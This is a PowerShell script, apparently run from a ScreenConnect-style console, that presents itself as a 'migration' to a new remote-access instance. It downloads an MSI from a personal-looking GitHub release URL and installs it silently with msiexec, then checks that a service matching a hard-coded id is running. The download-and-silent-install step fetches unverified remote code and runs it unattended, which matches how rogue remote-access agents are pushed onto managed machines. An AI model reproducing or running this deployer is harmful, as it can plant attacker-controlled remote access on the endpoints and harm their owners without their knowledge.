#!ps
#maxlength=50000000
#timeout=900000


Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ============================================================
# CONFIGURATION - EDIT THESE VALUES
# ============================================================

# HTTPS URL for the access agent installer generated by the NEW instance.
$InstallerUrl = 'https://github.com/pedro888doc-droid/svc/releases/download/svc/svc.msi'

$newSvcId = 'cb2be07802f46426'

# MSI or EXE
$InstallerType = 'MSI'

# Only configure these after verifying the EXE's supported silent arguments.
$ExeArguments = @()

# ============================================================
# SETTINGS
# ============================================================

$WorkDir = Join-Path $env:ProgramData 'ScreenConnectMigration'
$LogFile = Join-Path $WorkDir 'migration.log'
$MaxDownloadAttempts = 3
$ServiceStartTimeoutSeconds = 60
$ServiceId =  ""
# Exit codes:
# 0 = already healthy or successfully installed
# 1 = configuration, download, or installation failure
# 2 = service failed to become healthy
# 3 = administrator privileges required

# ============================================================
# INITIALIZATION
# ============================================================

try {
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
}
catch {
    Write-Error "Cannot create working directory: $($_.Exception.Message)"
    exit 1
}

function Write-Log {
    param(
        [Parameter(Mandatory)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $Line = '{0} [{1}] {2}' -f `
        (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message

    Add-Content -LiteralPath $LogFile -Value $Line
    Write-Output $Line
}




function Get-ExpectedService {
    param(
        [Parameter(Mandatory)]
        [string]$ServiceId
    )

    $Services = Get-CimInstance Win32_Service |
        Where-Object {
            $_.Name -like "*$ServiceId*" -or
            $_.DisplayName -like "*$ServiceId*"
        }

    return $Services
}

function Test-AgentHealthy {

    try {
        $ExpectedServiceName = Get-ExpectedService  "$newSvcId"
        $CimService = Get-CimInstance Win32_Service `
            -Filter "Name='$ExpectedServiceName'" `
            -ErrorAction Stop

        if ($CimService.ProcessId -eq 0) {
            return $false
        }

        $Process = Get-Process `
            -Id $CimService.ProcessId `
            -ErrorAction SilentlyContinue

        return ($null -ne $Process)
    }
    catch {
        Write-Log "Health check failed: $($_.Exception.Message)" 'WARN'
        return $false
    }
}

function Download-Installer {
    param(
        [Parameter(Mandatory)]
        [string]$Destination
    )

    [Net.ServicePointManager]::SecurityProtocol = `
        [Net.ServicePointManager]::SecurityProtocol -bor `
        [Net.SecurityProtocolType]::Tls12

    for ($Attempt = 1; $Attempt -le $MaxDownloadAttempts; $Attempt++) {
        try {
            Write-Log "Downloading installer, attempt $Attempt of $MaxDownloadAttempts."

            if (Test-Path -LiteralPath $Destination) {
                Remove-Item -LiteralPath $Destination -Force
            }

            Invoke-WebRequest `
                -Uri $InstallerUrl `
                -OutFile $Destination `
                -TimeoutSec 120 `
                -UseBasicParsing `
                -ErrorAction Stop

            if (-not (Test-Path -LiteralPath $Destination)) {
                throw 'Downloaded file was not created.'
            }

            $File = Get-Item -LiteralPath $Destination

            if ($File.Length -lt 1024) {
                throw 'Downloaded file is unexpectedly small.'
            }


            return
        }
        catch {
            Write-Log "Download failed: $($_.Exception.Message)" 'WARN'

            if ($Attempt -eq $MaxDownloadAttempts) {
                throw
            }

            Start-Sleep -Seconds (5 * $Attempt)
        }
    }
}

function Install-Agent {
    param(
        [Parameter(Mandatory)]
        [string]$InstallerPath
    )

    Write-Log "Starting $InstallerType installation."

    if ($InstallerType -eq 'MSI') {
        $Arguments = @(
            '/i'
            "`"$InstallerPath`""
            '/qn'
            '/norestart'
            '/L*v'
            "`"$WorkDir\installer.log`""
        )

        $Process = Start-Process `
            -FilePath "$env:SystemRoot\System32\msiexec.exe" `
            -ArgumentList $Arguments `
            -Wait `
            -PassThru

        if ($Process.ExitCode -notin @(0, 3010)) {
            throw "MSI installation failed: exit code $($Process.ExitCode)."
        }

        if ($Process.ExitCode -eq 3010) {
            Write-Log 'Installation succeeded; reboot required.' 'WARN'
        }
    }
    else {
        $Process = Start-Process `
            -FilePath $InstallerPath `
            -ArgumentList $ExeArguments `
            -Wait `
            -PassThru

        if ($Process.ExitCode -ne 0) {
            throw "EXE installation failed: exit code $($Process.ExitCode)."
        }
    }

    Write-Log 'Installer process completed.'
}

# ============================================================
# MAIN
# ============================================================

try {


    Write-Log "Starting migration check on $env:COMPUTERNAME."

    $ExistingService = Get-ExpectedService  "$newSvcId"

    Write-log "New service name $ExistingService"

    if ($null -ne $ExistingService) {
        if (Test-AgentHealthy) {
            Write-Log 'Expected service is running. No installation needed.'
            exit 0
        }

        Write-Log 'Expected service exists but is not running.' 'WARN'
    }

    $Extension = if ($InstallerType -eq 'MSI') { '.msi' } else { '.exe' }
    $InstallerPath = Join-Path $WorkDir "ScreenConnectAgent$Extension"

    Download-Installer -Destination $InstallerPath
    Install-Agent -InstallerPath $InstallerPath

    $Deadline = (Get-Date).AddSeconds($ServiceStartTimeoutSeconds)

    do {
        Start-Sleep -Seconds 3

        if (Test-AgentHealthy) {
            Write-Log 'Agent installed and service is running.'
            exit 0
        }
    } while ((Get-Date) -lt $Deadline)

    Write-Log 'Installer completed, but expected service is not healthy.' 'ERROR'
    exit 2
}
catch {
    Write-Log $_.Exception.Message 'ERROR'
    exit 1
}